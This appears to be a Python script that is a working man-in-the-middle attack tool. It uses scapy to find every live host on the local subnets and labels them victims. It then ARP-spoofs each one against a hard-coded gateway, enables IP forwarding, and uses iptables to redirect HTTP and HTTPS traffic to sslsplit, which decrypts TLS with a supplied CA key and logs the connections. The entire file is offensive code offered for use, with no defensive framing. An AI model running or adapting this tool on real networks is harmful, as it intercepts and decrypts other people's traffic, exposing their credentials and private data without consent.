import ipaddress
import netifaces
import scapy.all as scapy
import threading
import os
import time
from queue import Queue
import shutil


GATEWAY_IP = '10.6.0.254'
IPS: Queue = Queue()
LOG_DIR = 'log'


def get_mac(ip: str):
    try:
        ans = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") /
                        scapy.ARP(pdst=ip), timeout=2, verbose=False)[0]
    except Exception:
        return None
    else:
        if len(ans) == 0:
            return None
        return ans[0][1].hwsrc


def alive(ip: str) -> bool:
    mac = get_mac(ip)
    if mac is None:
        return False
    print(f'{ip}\t{get_mac(ip)}')
    IPS.put(ip)
    return True


def get_victims() -> list:
    threads = list()
    for ifname in netifaces.interfaces():
        if ifname != 'lo':
            addr = netifaces.ifaddresses(ifname)[netifaces.AF_INET][0]['addr']
            mask = netifaces.ifaddresses(
                ifname)[netifaces.AF_INET][0]['netmask']
            iface = ipaddress.IPv4Interface(f'{addr}/{mask}')
            network = ipaddress.ip_network(iface.network)
            for ip in network:
                threads.append(threading.Thread(
                    target=alive, args=[str(ip)]))
    print(f'Available Devices')
    print(f'--------------------------------------------------')
    print('IP\t\tMAC')
    print(f'--------------------------------------------------')
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(f'--------------------------------------------------')
    return list(IPS.queue)


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=get_mac(target_ip),
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def trick(victim_ips: str):
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    while True:
        for victim_ip in victim_ips:
            spoof(victim_ip, GATEWAY_IP)
            spoof(GATEWAY_IP, victim_ip)
        time.sleep(10)


def sslsplit():
    os.system(
        'iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080')
    os.system(
        'iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')
    shutil.rmtree(LOG_DIR, ignore_errors=True)
    os.makedirs(LOG_DIR)
    os.system(
        f'sslsplit ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 -k ca.key -c ca.crt -l connection.log -S {LOG_DIR} > /dev/null 2>/dev/null')
